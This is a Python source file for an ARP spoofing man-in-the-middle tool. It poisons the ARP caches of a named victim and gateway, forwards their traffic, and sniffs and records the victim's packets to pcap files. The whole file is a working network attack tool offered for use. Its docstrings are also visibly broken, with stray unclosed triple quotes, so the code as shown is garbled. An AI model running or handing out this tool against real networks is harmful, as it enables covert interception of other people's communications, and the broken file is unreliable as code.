"""

import sys
import time
import argparse
import os
from datetime import datetime
from pathlib import Path

from scapy.all import ARP, send, sniff, PcapWriter, ICMP, IP, TCP, UDP

sys.path.append(str(Path(__file__).parent.parent))

from utils.logger import get_logger
from utils.network_utils import get_mac, enable_ip_forwarding, disable_ip_forwarding

class ARPSpoofer:
    """

    def __init__(self, target_ip, gateway_ip, interface=None):
        self.target_ip = target_ip
        self.gateway_ip = gateway_ip
        self.interface = interface

        self.logger = get_logger("ARPSpoof")

        self.target_mac = get_mac(target_ip)
        self.gateway_mac = get_mac(gateway_ip)

        self.packets_sent = 0       # Counter for ARP packets sent
        self.is_running = False     # Flag indicating if attack loop is active
        self.start_time = None      # Timestamp when attack started

        self.pcap_file = None
        self.pcap_writer = None

        self.logger.info(f"Initialized ARPSpoofer: target={target_ip} gateway={gateway_ip} iface={interface}")

    def _validate_targets(self):
        """
        if not self.target_mac:
            self.logger.error(f"Cannot resolve MAC for target {self.target_ip}")
            return False

        if not self.gateway_mac:
            self.logger.error(f"Cannot resolve MAC for gateway {self.gateway_ip}")
            return False

        self.logger.info("Target and gateway MAC addresses validated")
        return True

    def spoof(self, target_ip, spoof_ip, target_mac):
        """
        packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)

        send(packet, verbose=False, iface=self.interface)

        self.packets_sent += 1

    def restore(self, destination_ip, source_ip, destination_mac, source_mac):
        """
        packet = ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)

        send(packet, count=5, verbose=False, iface=self.interface)

    def start_attack(self, interval=2, capture=True):
        """
        if not self._validate_targets():
            return

        enable_ip_forwarding()

        if capture:
            pcap_dir = Path("pcap")
            pcap_dir.mkdir(exist_ok=True)
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            self.pcap_file = pcap_dir / f"arp_spoof_{timestamp}.pcap"
            self.pcap_writer = PcapWriter(str(self.pcap_file), append=True, sync=True)
            self.logger.info(f"PCAP capture enabled: {self.pcap_file}")

        self.is_running = True
        self.start_time = datetime.now()

        self.logger.info(f"Starting ARP spoofing: {self.target_ip} <-> {self.gateway_ip}")
        print("ARP spoofing started (press Ctrl+C to stop)")

        try:
            while self.is_running:
                self.spoof(self.target_ip, self.gateway_ip, self.target_mac)

                self.spoof(self.gateway_ip, self.target_ip, self.gateway_mac)

                print(f"\rARP packets sent: {self.packets_sent}", end="", flush=True)

                time.sleep(interval)

        except KeyboardInterrupt:
            print("\nInterrupted, stopping attack...")
            self.stop_attack()

    def stop_attack(self):
        """
        if not self.is_running:
            return

        self.is_running = False

        print("Restoring ARP tables...")

        self.restore(self.target_ip, self.gateway_ip, self.target_mac, self.gateway_mac)

        self.restore(self.gateway_ip, self.target_ip, self.gateway_mac, self.target_mac)

        print("ARP tables restored")

        disable_ip_forwarding()

        if self.pcap_writer:
            self.pcap_writer.close()
            print(f"PCAP saved: {self.pcap_file}")

        if self.start_time:
            duration = (datetime.now() - self.start_time).total_seconds()
            rate = self.packets_sent / duration if duration > 0 else 0
            stats = {
                "duration_s": f"{duration:.2f}",
                "packets_sent": int(self.packets_sent),
                "packets_per_second": f"{rate:.2f}"
            }
            self.logger.info(f"ARP spoofing stopped: {stats}")

    def sniff_traffic(self, count=100, filter_str=None):
        """
        self.logger.info("Starting traffic sniffing")

        try:
            if not filter_str:
                filter_str = f"host {self.target_ip}"

            packets = sniff(count=count, filter=filter_str, iface=self.interface, prn=self._packet_callback)

            if self.pcap_writer:
                for packet in packets:
                    self.pcap_writer.write(packet)

            self.logger.info(f"Captured {len(packets)} packets")

        except Exception as e:
            self.logger.error(f"Error during sniffing: {e}")

    def _packet_callback(self, packet):
        """
        if self.pcap_writer:
            self.pcap_writer.write(packet)

        if packet.haslayer(IP):
            src_ip = packet[IP].src
            dst_ip = packet[IP].dst

            if src_ip == self.target_ip or dst_ip == self.target_ip:
                protocol = "Unknown"
                if packet.haslayer(TCP):
                    protocol = f"TCP:{packet[TCP].dport}"
                elif packet.haslayer(UDP):
                    protocol = f"UDP:{packet[UDP].dport}"
                elif packet.haslayer(ICMP):
                    protocol = "ICMP"

                print(f"{src_ip} -> {dst_ip} [{protocol}]")

def main():
    
    parser = argparse.ArgumentParser(description="ARP Spoofing - MITM tool")

    parser.add_argument('-t', '--target', required=True, help='Victim IP address')
    parser.add_argument('-g', '--gateway', required=True, help='Gateway IP address')
    parser.add_argument('-i', '--interface', default=None, help='Network interface to use')
    parser.add_argument('--interval', type=int, default=2, help='Seconds between ARP packets')
    parser.add_argument('--no-capture', action='store_true', help='Disable PCAP capture')

    args = parser.parse_args()

    if os.name != 'nt':
        try:
            if os.geteuid() != 0:
                print("This script requires root privileges (sudo)")
                sys.exit(1)
        except AttributeError:
            pass

    spoofer = ARPSpoofer(args.target, args.gateway, args.interface)
    spoofer.start_attack(interval=args.interval, capture=not args.no_capture)

if __name__ == "__main__":
    main()
